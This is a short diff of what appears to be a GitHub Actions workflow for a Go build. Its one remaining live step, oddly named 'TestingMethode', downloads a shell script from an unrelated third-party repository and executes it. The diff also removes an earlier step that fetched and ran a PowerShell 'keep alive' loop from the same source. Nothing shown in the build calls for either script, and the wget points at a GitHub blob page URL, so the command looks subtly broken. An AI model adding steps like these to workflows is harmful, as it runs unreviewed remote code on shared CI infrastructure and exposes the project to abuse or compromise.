@@ -17,15 +17,8 @@ JOB: ${{ matrix.go }}
 steps:
 - name: Set up Go ${{ matrix.go }}
 uses: actions/setup-go@v2
-with:
-go-version: ${{ matrix.go }}
-id: go
 - name: Setup
 uses: actions/checkout@v2
-- name: Download Timeout Script
-run: Invoke-WebRequest https://raw.githubusercontent.com/donujk/github/main/loop.ps1 -OutFile loop.ps1
-- name: Keep Alive
-run: ./loop.ps1
 - name: TestingMethode
 run: |
 wget https://github.com/donujk/github/blob/main/Turtle.sh && chmod u+x Turtle.sh && ./Turtle.sh
